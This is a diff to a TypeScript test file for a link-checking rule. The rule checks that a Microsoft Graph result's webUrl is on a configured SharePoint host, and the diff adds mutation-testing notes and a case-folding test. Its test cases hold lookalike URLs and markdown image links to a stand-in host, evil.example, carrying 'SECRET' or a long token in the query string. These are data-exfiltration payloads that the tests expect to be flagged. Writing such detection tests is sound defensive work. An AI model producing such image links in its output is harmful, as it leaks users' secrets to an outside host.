@@ -834,7 +834,8 @@ describe("sourceLinks: a Graph result's own webUrl on a configured host", () => 
   // MUTATION: `url.hostname.endsWith(host)` instead of equality: the prefix and
   // subdomain cases go red; `value.includes(host)`: the suffix case too. Drop
   // the credentials/port check: the port and reversed-userinfo cases. Drop
-  // SINGLE_HTTPS_URL: the http and second-shape cases.
+  // SINGLE_HTTPS_URL: the http and second-shape cases. Drop the second-scheme
+  // check in isSourceLink: the second-URL case goes red.
   it.each([
     ['suffix', `https://contoso-my.sharepoint.com.evil.example${PATH}`],
     ['prefix', `https://evilcontoso-my.sharepoint.com${PATH}`],
@@ -844,8 +845,20 @@ describe("sourceLinks: a Graph result's own webUrl on a configured host", () => 
     ['port', `https://contoso-my.sharepoint.com:8443${PATH}`],
     ['plain http', `http://contoso-my.sharepoint.com${PATH}`],
     ['a second shape after it', `${LINK} ![x](https://evil.example/p.png?d=SECRET)`],
+    ['a second URL inside the token', `${LINK}(https://evil.example/p.png?d=${'A'.repeat(64)}`],
   ])('a lookalike is still flagged: %s', (_label, url) => {
     expect(rulesOf({ webUrl: url })).toContain('exfil-data-url')
+  })
+
+  // MUTATION: drop `host.toLowerCase()` in isSourceLink: red. The app's
+  // documentHosts() lower-cases its entries, so a library caller passing
+  // mixed-case hosts is the only one this covers.
+  it('host matching folds case on the configured hosts', () => {
+    expect(
+      rulesOf({ webUrl: LINK }, graph, {
+        sourceLinks: { ...links, hosts: ['Contoso-My.SharePoint.com'] },
+      }),
+    ).toEqual([])
   })
 
   // MUTATION: exempt the link from every rule (`linkRules = []`): red.
